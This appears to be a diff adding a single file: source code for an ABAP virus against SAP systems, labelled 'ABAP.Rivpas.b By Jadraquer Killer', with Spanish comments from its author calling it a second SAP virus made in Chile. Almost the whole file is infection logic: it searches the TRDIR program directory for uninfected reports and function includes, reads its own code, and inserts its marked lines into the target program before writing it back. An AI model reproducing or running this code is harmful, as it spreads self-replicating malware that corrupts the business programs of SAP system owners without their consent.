@@ -1,0 +1,29 @@
+Report Jadra Virus. "ABAP.Rivpas.b By Jadraquer Killer
+*Segundo virus para SAP hecho en Chile
+*No me traten como Lammer, solo estoy tratando de crear un segundo virus pa' esta wea q ni yo conosco
+*Ojala que al menos funcione.
+*Madonna I-Love-You
+
+TABLES TRDIR. DATA: VIN(72) OCCURS 0, VOUT(72) OCCURS 0. "JadraVirus
+SELECT NAME INTO SY-TNAME FROM TRDIR WHERE UNAM NE 'JadraVirus' AND
+( SUBC = '1' OR ( SUBC = 'I' AND NAME LIKE 'H____R__' ) ).
+IF TRDIR-SUBC = 'I'. SY-TVAR0 = 'FUNCTION'. ELSE. SY-TVAR0 = 'report'.
+ENDIF. EXIT.
+ENDSELECT. CHECK SY-SUBRC = 0.
+*update trdir set: name = 'JadraVirus', sqlx = ' ' where name = sy-tname.
+READ REPORT SY-TNAME INTO VIN. READ REPORT SY-REPID INTO VOUT.
+LOOP AT VIN INTO SY-ENTRY.
+TRANSLATE SY-ENTRY TO UPPER CASE. SEARCH SY-ENTRY FOR SY-TVAR0.
+CHECK SY-SUBRC = 0 AND SY-ENTRY+0(1) NE '*'.
+LOOP AT VIN INTO SY-ENTRY FROM SY-TABIX.
+TRANSLATE SY-ENTRY USING '.X'. SEARCH SY-ENTRY FOR 'X'.
+CHECK SY-SUBRC = 0. SY-WILLI = SY-TABIX + 1. EXIT.
+ENDLOOP. EXIT. ENDLOOP. CHECK SY-SUBRC = 5.
+LOOP AT VOUT INTO SY-ENTRY.
+IF SY-PAGNO = 3. SY-PAGNO = 4. ENDIF.
+SEARCH SY-ENTRY FOR 'JadraVirus'.
+IF SY-SUBRC = 0. SY-PAGNO = SY-PAGNO + 1. ENDIF.
+CHECK SY-PAGNO = 0. DELETE VOUT.
+ENDLOOP. INSERT LINES OF VOUT FROM 1 INTO VIN INDEX SY-WILLI.
+insert report sy-tname from vin. CLEAR SY. "<---JadraVirus
+
